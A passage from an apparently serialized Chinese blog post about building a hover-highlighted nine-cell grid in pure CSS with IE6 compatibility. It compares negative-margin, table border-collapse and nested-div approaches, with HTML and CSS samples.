class=\"line\"><span class=\"id\">#test0</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin</span>:<span class=\"value\"> <span class=\"number\">30px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">200px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">200px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test0</span> <span class=\"tag\">div</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">float</span>:<span class=\"value\"> left</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#eee</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#00f</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\"> center</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">color</span>:<span class=\"value\"> <span class=\"hexcolor\">#090</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> relative</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test0</span> <span class=\"class\">.lr_indent</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-left</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-right</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test0</span> <span class=\"class\">.tb_indent</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-top</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-bottom</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test0</span> <span class=\"tag\">div</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#f00</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">z-index</span>:<span class=\"value\"> <span class=\"number\">999</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#eee</span></span></span>;<span class=\"comment\">/*必须加这一句，在IE6，7有bug*/</span></div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<blockquote>\n<p>思考：这样的方式好吗？不够好。<br>这才是9宫格，如果是16，25，…，81个格子，设置margin缩进的人力代价是很高的。<br>兼容性，在IE6，7下，负值margin在hover时候有bug。</p>\n</blockquote>\n<p><img src=\"/assets/blogImg/jiugongge4.jpg\" alt=\"ie6，7下，hover时负值margin-left不起效\">      </p>\n<h2 id=\"后来的想法\"><strong>后来的想法</strong></h2>\n<p>经过第一次尝试，我得到一个经验：<code>要用一种通用的方法去解决“公用边”</code>，而不是分别设置.lr_indent和.tb_indent。<br>随即我想到了表格。作为table，它有个很突出的属性，就是合并border，css里面的设置为<code>border-collapse:collapse;</code>。ok，这就是key point。</p>\n<p>按照这个思路，我简单的编写了代码，一开始我把hover定位到td上面去，发现hover时也会出现第一个想法中“挡住”的情况。而且，去将td的position改变，再添加z-index的方法是不可能有用的(z-index不会起效)。   </p>\n<p>我的方法是在td中包含一个span，把hover定位到span中去，td设置为<code>position:relative;</code>，span设置为<code>position:absolute;</code>，这时候的hover就可以设置让span的border不被挡住展示了。<br>代码君又来了：<br>html：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"test1\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">table</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>4<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>7<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>9<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"title\">table</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>css：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">*<span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin</span>:<span class=\"value\"><span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">padding</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"tag\">table</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border-collapse</span>:<span class=\"value\"> collapse</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test1</span> <span class=\"tag\">td</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#eee</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> relative</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#00f</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\"> center</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test1</span> <span class=\"tag\">td</span> <span class=\"tag\">span</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">color</span>:<span class=\"value\"> <span class=\"hexcolor\">#090</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">display</span>:<span class=\"value\">block</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> absolute</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">left</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test1</span> <span class=\"tag\">td</span> <span class=\"tag\">span</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#f00</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-top</span>:<span class=\"value\">-<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-left</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<p>别忘了span在hover时，必须设置一个负的<code>margein-top</code>和<code>margein-left</code>，以保证红色边框恰好定位在格子四周。见css君最后的片段。假如不设置，你看到的将是这样：<br><img src=\"/assets/blogImg/jiugongge5.jpg\" alt=\"未设置span:hover的margin\"><br>本以为已经大功告成了，在IE中测试却让我傻了眼：<br><img src=\"/assets/blogImg/jiugongge6.jpg\" alt=\"IE7下的情景\"><br>（ps：作为前端一枚，我已经做好了妥妥的心理准备，但此情此景还是让人喷出一口老血……）</p>\n<h2 id=\"改进，改进\"><strong>改进，改进</strong></h2>\n<p>说实话，table和div之争这么多年，大家都在页面中用越来越多的div，而越发的鄙视table，反而对table的熟悉程度反应了前端们的基础是否扎实。吃一堑长一智，这句话特别适用于在table中翻江倒海的亲们。</p>\n<p>改进！</p>\n<p>首先这个bug（也无所谓是不是bug，算是浏览器的差异性吧）我知道，在table的td里面设置了<code>position:relative;</code>就会在IE中出现这样的情况。注意是所有的IE哦，包括IE10。而根据第二个思路，最后的hover定位的元素为span，它本身设定为<code>position:absolute;</code>它的父级元素必须得设置<code>position:relative;</code>才能完成题目功能，这是毋庸置疑的。</p>\n<p>既然现在span的父级td不能设置<code>position:relative;</code>，我就在它们之间添加一个div，用来做span的容器。 </p>\n<p>代码君再一次来了：<br>html:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"test2\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">table</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>4<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>7<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"title\">td</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"title\">span</span>&gt;</span>9<span class=\"tag\">&lt;/<span class=\"title\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">td</span>&gt;</span></div><div class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"title\">tr</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"title\">table</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>css:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">*<span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin</span>:<span class=\"value\"><span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">padding</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"tag\">table</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border-collapse</span>:<span class=\"value\"> collapse</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test2</span> <span class=\"tag\">td</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#eee</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#00f</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">text-align</span>:<span class=\"value\"> center</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">vertical-align</span>:<span class=\"value\"> top</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test2</span> <span class=\"tag\">td</span> <span class=\"tag\">div</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\">relative</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test2</span> <span class=\"tag\">td</span> <span class=\"tag\">div</span> <span class=\"tag\">span</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">color</span>:<span class=\"value\"> <span class=\"hexcolor\">#090</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">display</span>:<span class=\"value\">block</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> absolute</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">left</span>:<span class=\"value\"> <span class=\"number\">0</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">line-height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#test2</span> <span class=\"tag\">td</span> <span class=\"tag\">div</span> <span class=\"tag\">span</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">5px</span> solid <span class=\"hexcolor\">#f00</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-left</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-top</span>:<span class=\"value\"> -<span class=\"number\">5px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<p>OK，效果达成！<br><img src=\"/assets/blogImg/jiugongge7.jpg\" alt=\"最终完成的效果\"><br>可以猛点这里看看<a href=\"/assets/demo/jiugongge_demo.html\">demo</a>。        </p>\n<p><strong>最后吐槽，不对，总结一下下：</strong>           </p>\n<blockquote>\n<p>先到IE上去测，再转到其它浏览器，以少走弯路，这叫擒贼先擒王-_-!；<br>win8的metro布局最近挺流行的，有时候table比div好用；<br>IE君，你真是……此处省略1024个字                </p>\n</blockquote>\n<p>这个系列打算写两篇文章，下一篇介绍另外一种更简洁的方法。:)</p>\n","source":"_posts/css-jiugongge.markdown","raw":"---\nlayout: post\ntitle: \"css实现九宫格(一)\"\ndate: 2012-12-14 19:15\ncomments: true\ntags: \n\t- css\nkey: \"3\"\n---\n前段时间，我的 leader Henry在群里面分享了一道[一淘](http://www.etao.com/)的面试题。         题目非常的有趣，忙完前阵的工作之后突然记起，也尝试做了一下。\n\n> 9个元素，每个50*50px，排成九宫格\n> 默认是border颜色为blue，hover到格子上变成red（兼容到IE6）\n\n![css题目](/assets/blogImg/jiugongge1.jpg)    \n\n<!--more-->\n做成九宫格大家都会，但题目的陷阱就在hover上。鼠标hover到格子4，格子5时，其实他们“共用”了一条边。由于是纯css实现的，我们不可能说用js去动态改变dom，因此怎样实现“公用边”就成为了难点。\n\n**尝试的过程：**           \n\n+ 我的第一个想法，用“叠加”的方式实现“公用边”；        \n+ 后来的想法，用table的border-collapse实现“公用边”；          \n+ 在table想法的基础上改进；\n+ 一种更简便的做法，不需要border，见九宫格(二)                       \n\n##**我的第一个想法**       \n\n先做做看，尝试永远是第一步。我将9个div都设置了5px的border，排成了九宫格，添加了hover，这时候初始的效果是：     \n![初始效果](/assets/blogImg/jiugongge2.jpg)      \n这样其实格子之间的距离是两倍border（10px）。需要再将中间的一竖（2，5，8）设置<code>margin-left:-5px;margin-right:-5px;</code>,再将中间的一横（3，4，5）设置<code>margin-top:-5px;margin-bottom:-5px;</code>，这样等于是强制把格子间的距离“拉”到5px。        \n![把格子间的距离“拉”到5px](/assets/blogImg/jiugongge3.jpg)  \n到这一步，简单的九宫格是完成了，但hover之后会发现，格子的边会被挡住（格子5的下边和右边分别被格子8和格子6挡住）。因为这里“公用边”的思路准确来说是“重合边”，是用负值的margin强制定位的。而我的解决方式是hover时添加<code>z-index:999</code>，让hover到的格子在最上层显示而不会被挡住。同时，不要忘记在9个div的css里面添加一句让z-index生效的<code>position: relative;</code>，具体原因看[这里](http://www.csser.com/question/4f4332dedbc7b0ac4c00034e)。     \n\n代码君：           \n1.html：\n```html\n<div id=\"test0\">\n\t<div>1</div>\n\t<div class=\"lr_indent\">2</div>\n\t<div>3</div>\n\t<div class=\"tb_indent\">4</div>\n\t<div class=\"lr_indent tb_indent\">5</div>\n\t<div class=\"tb_indent\">6</div>\n\t<div>7</div>\n\t<div class=\"lr_indent\">8</div>\n\t<div>9</div>\n</div>\n```\n2.css:\n```css\n#test0{\n\tmargin: 30px;\n\twidth: 200px;\n\theight: 200px;\n}\n#test0 div{\n\twidth: 50px;\n\theight: 50px;\n\tfloat: left;\n\tbackground: #eee;\n\tborder: 5px solid #00f;\n\ttext-align: center;\n\tline-height: 50px;\n\tcolor: #090;\n\tposition: relative;\n}\n#test0 .lr_indent{\n\tmargin-left: -5px;\n\tmargin-right: -5px;\n}\n#test0 .tb_indent{\n\tmargin-top: -5px;\n\tmargin-bottom: -5px;\n}\n#test0 div:hover{\n\tborder: 5px solid #f00;\n\tz-index: 999;\n\tbackground: #eee;/*必须加这一句，在IE6，7有bug*/\n}\n```\n> 思考：这样的方式好吗？不够好。                \n> 这才是9宫格，如果是16，25，…，81个格子，设置margin缩进的人力代价是很高的。              \n> 兼容性，在IE6，7下，负值margin在hover时候有bug。\n\n![ie6，7下，hover时负值margin-left不起效](/assets/blogImg/jiugongge4.jpg)      \n\n##**后来的想法**      \n\n经过第一次尝试，我得到一个经验：<code>要用一种通用的方法去解决“公用边”</code>，而不是分别设置.lr_indent和.tb_indent。\n随即我想到了表格。作为table，它有个很突出的属性，就是合并border，css里面的设置为<code>border-collapse:collapse;</code>。ok，这就是key point。\n\n按照这个思路，我简单的编写了代码，一开始我把hover定位到td上面去，发现hover时也会出现第一个想法中“挡住”的情况。而且，去将td的position改变，再添加z-index的方法是不可能有用的(z-index不会起效)。   \n\n我的方法是在td中包含一个span，把hover定位到span中去，td设置为<code>position:relative;</code>，span设置为<code>position:absolute;</code>，这时候的hover就可以设置让span的border不被挡住展示了。        \n代码君又来了：        